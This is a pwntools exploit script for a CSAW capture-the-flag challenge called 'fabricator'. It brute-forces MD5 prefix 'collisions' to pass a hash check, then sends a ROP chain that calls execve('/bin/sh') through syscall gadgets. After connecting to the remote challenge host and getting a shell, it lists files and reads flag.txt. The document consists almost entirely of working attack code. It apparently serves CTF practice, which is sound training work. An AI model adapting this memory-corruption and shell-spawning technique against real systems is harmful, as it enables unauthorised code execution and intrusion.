#!/usr/bin/env python3

from pwn import *
from Crypto.Hash import MD5

prefix = b"Hi, my name is Jangui. My card is my passport. Please verify me."

def collide(payload):
    assert len(payload) == 400 - 256
    collisions = []
    i = 10000000
    while len(collisions)<2:
        msg = (prefix
              +str(i).encode()
              +b'/bin/sh\0'
              +b'A'*(256-len(prefix)-len(str(i))-len('/bin/sh\0'))
              +payload
              )
        h = MD5.new()
        h.update(msg)
        if h.hexdigest()[:2] == '00':
            collisions.append(msg)
        i+=1
    return collisions

### ROP ###
front_padding = b'B'*24
pop_rdi = p64(0x00000000004006c6)
pop_rsi = p64(0x00000000004010dc)
pop_rax = p64(0x000000000041c0c4)
pop_rdx = p64(0x0000000000452856)
syscall = p64(0x000000000047ba25)
bin_sh  = p64(0x00000000006c4580 + 64 + 8)

payload  = front_padding
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += bin_sh
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall

back_padding = b'Z'*(144-len(payload))
payload += back_padding
###########

### Solve the "Crypto" part
ids = collide(payload)

### Choose a target 
if args.GDB:
    conn = gdb.debug('./fabricator', gdbscript=(''
         +'break validHashes\n'
         +'break runGame\n'
         +'break *0x00400dae\n'#just put success message
         +'break *0x400dc8\n'#just copied id1 to stack
         +'c\n'#start automatically
        )
    )
elif args.LOCAL:
    conn = process('./fabricator')
else:
    conn = remote('web.red.csaw.io',5012)

### Interact ###
print(conn.recvuntil('>'))
print(ids[0])
conn.send(ids[0])

print(conn.recvuntil('>'))
print(ids[1])
conn.send(ids[1])
################

### WIN ###
print(conn.recv().decode())

print('ls')
conn.sendline('ls')

print(conn.recv().decode())

print('cat flag.txt')
conn.sendline('cat flag.txt')

print(conn.recv().decode())
print()

conn.close()
